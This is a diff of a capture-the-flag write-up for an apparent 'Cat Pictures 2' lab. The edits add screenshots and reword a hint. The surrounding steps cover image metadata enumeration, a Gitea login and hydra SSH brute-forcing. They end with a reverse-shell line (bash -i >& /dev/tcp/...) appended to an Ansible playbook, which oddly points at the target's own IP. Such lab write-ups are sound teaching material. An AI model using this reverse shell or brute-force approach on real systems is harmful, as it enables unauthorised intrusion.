@@ -24,7 +24,7 @@ PORT     STATE SERVICE
 
 8080/tcp open  http-proxy
 
-we will start enumerating the webpage at port 80. we see some pictures of cats. in the top right corner, there is a about icon which shows more details about the image we are viewing. lets use this to get some hidden details in the cat images. after some manual enumeration we find out that in the description of the cat image timo-volz there is a message which says "strip hidden metadata" maybe there is something hidden in this image. lets save this image on our system and run some metadata exfiltration commands on this image.
+we will start enumerating the webpage at port 80. we see some pictures of cats. in the top right corner, there is a about icon which shows more details about the image we are viewing. lets use this to get some hidden details in the cat images. after some manual enumeration we find out that in the description of the cat image timo-volz there is a message which says "strip metadata" maybe there is something hidden in this image. lets save this image on our system and run some metadata exfiltration commands on this image.
 ![timo-volz](https://github.com/realatharva15/cat_pictures_2_writeup/blob/main/images/Screenshot%202026-01-14%20at%2013-13-30%20Lychee%20-%20timo-volz.png)
 ```bash
 exiftool timo-volz.jpg
@@ -76,6 +76,7 @@ we will visit this gitea webpage on the port 3000 and enter the credentials we f
 ```bash
 http://<target_ip>:3000
 ```
+![erorr_at_giteas](https://github.com/realatharva15/cat_pictures_2_writeup/blob/main/images/Screenshot%202026-01-14%20at%2013-38-04%20Problem%20loading%20page.png)
 NOTE: once you login the gitea, the firefox browser will block browsing to the gitea main page wince the ip will change from the target ip to localhost. in order to fix that, just re-type the target ip address in the url in the place of localhost.
 
 this i cannot show you the url directly but i will show you the images of the webpage where the domain is localhost and when the domain is the target ip address.
@@ -88,7 +89,7 @@ enter the username and the password when prompted. we will find out that there a
 o grant us access to the ssh shell. lets try using hydra to see if that user's ssh password can be bruteforced or not.
 
 username:bismuth
-
+![giteas_interace](https://github.com/realatharva15/cat_pictures_2_writeup/blob/main/images/Screenshot%202026-01-14%20at%2013-38-49%20samarium_ansible%20-%20ansible%20-%20Gitea%20Git%20with%20a%20cup%20of%20tea.png)
 now we will visit the OliveTin website on the port 1337 and find out a way to get a shell on the system. we find out that there are 4 buttons on the webiste which carry out 4 different tasks.
 
 ```bash
@@ -96,7 +97,7 @@ http://<target_ip>:1337
 ```
 # Phase 2 - Initial Foothold:
 the 2nd function is important to us as the hint for the 2nd flag is directed towards the Ansible playbook function. as we already had found the ansible repository on the port 3000. after reading the contents of the playbook.yaml file, and executing the ansible playbook task by clicking on the button, we find out that the function is capable of carrying out commands on the system. here it carries out the whoami command by default as mentioned in the playbook.yaml file. so we will simply edit the playbook.yaml file and append a reverse shell to it. just paste this block of code into the playbook.yaml file in the ansible repository and refresh the page
-
+![olivetin](https://github.com/realatharva15/cat_pictures_2_writeup/blob/main/images/Screenshot%202026-01-14%20at%2021-01-45%20OliveTin.png)
 ```bash
  - name: Reverse Shell
       shell: bash -c 'bash -i >& /dev/tcp/<target_ip>/4444 0>&1'
